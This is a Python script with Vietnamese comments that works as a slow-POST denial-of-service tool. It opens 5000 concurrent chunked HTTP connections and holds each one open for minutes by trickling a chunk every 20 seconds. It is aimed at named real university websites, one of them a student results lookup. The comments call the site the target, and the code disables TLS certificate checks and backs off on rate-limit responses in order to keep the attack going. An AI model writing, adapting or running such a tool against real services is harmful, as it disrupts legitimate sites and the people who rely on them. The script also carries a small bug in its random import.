# stream_chunks_fixed.py
from random import random
import aiohttp #Chạy bất đồng bộ (async/await), Cho phép chạy nhiều việc cùng lúc mà không phải đợi xong luồng này mới chạy luồng khác
import asyncio #Thư viện hỗ trợ lập trình bất đồng bộ trong Python, giúp viết mã không chặn (non-blocking) và xử lý nhiều tác vụ cùng lúc.
import time #Thư viện cung cấp các hàm liên quan đến thời gian, như đo thời gian thực thi, định dạng thời gian, v.v.
import ssl #Thư viện hỗ trợ các chức năng liên quan đến SSL (Secure Sockets Layer) và TLS (Transport Layer Security) trong Python, giúp thiết lập kết nối mạng an toàn.
URL = "https://khoacntt.uneti.edu.vn/gioi-thieu/doi-ngu-giang-vien/"  # endpoint phải accept chunked https://sinhvien.uneti.edu.vn/tra-cuu/ket-qua-hoc-tap.html?k=X77OC0szRGLMBIX5sbr3slI1_jSNaUKx-PkrC67ducA
#URL = "https://sinhvien.uneti.edu.vn/tra-cuu/ket-qua-hoc-tap.html?k=9ZOxyOk9JjlvfGw3KH98eMul4bxmj6TNIhsO9cnuapOavw2y4urDZzKRz2Q4NA_W"
CONNS = 5000 #5000 D:\storageCodePython\tanCong.py
INTERVAL = 20       # gửi 1 chunk mỗi 20 giây
DURATION = 350      # tổng thời gian giữ kết nối 350
custom_timeout = aiohttp.ClientTimeout(
    total=None,       # Tổng thời gian (giống timeout=None)
    connect=15,       # Chỉ chờ KẾT NỐI (connect) trong 15 giây
    sock_connect=15,  # Thời gian chờ socket kết nối
    sock_read=None    # Thời gian chờ đọc (sau khi đã kết nối)
)
TIMEOUT = aiohttp.ClientTimeout(total=None) #không giới hạn thời gian chờ kết nối và phản hồi từ server. Khong tự động hủy kết nối do hết thời gian chờ.
sslcontext = ssl.create_default_context() # Tạo một ngữ cảnh SSL mặc định để thiết lập các kết nối an toàn. Tạo bộ quy tắc SSL mặc định Bao gồm: Danh sách CA đáng tin; Kiểm tra hostname; Kiểm tra chữ ký certificate; Phiên bản TLS an toàn;
sslcontext.check_hostname = False # Không kiểm tra hostname trong chứng chỉ SSL. Bỏ qua việc xác minh tên máy chủ khi thiết lập kết nối SSL. Điều này có thể làm giảm tính bảo mật, vì kết nối có thể không an toàn. KHÔNG kiểm tra: Domain bạn truy cập có đúng với domain trong Certificate không? 
sslcontext.verify_mode = ssl.CERT_NONE # Không kiểm tra tính hợp lệ của chứng chỉ SSL. Bỏ qua việc xác minh chứng chỉ máy chủ khi thiết lập kết nối SSL. Điều này có thể làm giảm tính bảo mật, vì kết nối có thể không an toàn. KHÔNG kiểm tra: Certificate này có đúng cho domain bạn truy cập không?
#1: lỗi ClientConnectorCertificateError(ConnectionKey(host='duchuynguyen.com.vn', port=443, is_ssl=True, ssl=True, proxy=None, proxy_auth=None, proxy_headers_hash=None), SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:997)'))
async def chunker(duration): #hàm bất đồng bộ tạo và gửi các chunk dữ liệu trong khoảng thời gian xác định
    start = time.time() #lấy thời gian hiện tại tính bằng giây kể từ epoch (1/1/1970)
    i = 1   #biến đếm số chunk đã gửi
    while time.time() - start < duration: #vòng lặp tiếp tục cho đến khi thời gian đã trôi qua vượt quá duration
        data = f"chunk {i}\n".encode() #tạo dữ liệu chunk dưới dạng byte
        print(f"[send] {data!r}") #in ra dữ liệu chunk đã tạo
        yield data #yield trả về một giá trị và tạm dừng hàm, giữ trạng thái của hàm để có thể tiếp tục từ điểm đó trong lần gọi tiếp theo
        i += 1 #tăng biến đếm chunk
        await asyncio.sleep(INTERVAL) #tạm dừng thực thi hàm trong khoảng thời gian INTERVAL giây mà không chặn các tác vụ khác

async def send_stream(idx):
    # connector limit=1 giúp tăng khả năng 1 TCP socket / task
    conn = aiohttp.TCPConnector(limit=1) #Tạo một kết nối TCP với giới hạn 1 kết nối đồng thời cho mỗi phiên làm việc (session)
    async with aiohttp.ClientSession(connector=conn, timeout=TIMEOUT) as session: #Tạo một phiên làm việc HTTP bất đồng bộ với kết nối TCP đã tạo và thời gian chờ không giới hạn 
        try:
            print(f"#{idx}: đã mở được luồng kết nối chunked đến mục tiêu ...")
            # chưa set header Transfer-Encoding: chunked vì aiohttp tự động set
            async with session.post(URL, data=chunker(DURATION), timeout=None, ssl=sslcontext) as resp: #Gửi một yêu cầu POST bất đồng bộ đến URL với dữ liệu được tạo từ hàm chunker trong khoảng thời gian DURATION, không giới hạn thời gian chờ và sử dụng ngữ cảnh SSL đã cấu hình 
                if resp.status in (429, 503):
                    await asyncio.sleep(random.uniform(5, 15))
                    return

                elif resp.status >= 400:
                    return
                print(f"#{idx}: phản hồi trngj thái nhận được rưtf sểver {resp.status}")
                text = await resp.text() #Đọc toàn bộ nội dung phản hồi từ server dưới dạng văn bản bất đồng bộ
                print(f"#{idx}: ĐỘ dài phản hồi mục tiêu={len(text)}") 
                
        except Exception as e:
            print(f"#{idx}: lỗi {e!r}")

async def main():
    tasks = [asyncio.create_task(send_stream(i+1)) for i in range(CONNS)] #Tạo một danh sách các tác vụ bất đồng bộ để gửi các luồng kết nối chunked đến mục tiêu
    await asyncio.gather(*tasks) #Chạy tất cả các tác vụ bất đồng bộ cùng lúc và chờ cho đến khi tất cả hoàn thành

if __name__ == "__main__":
    asyncio.run(main())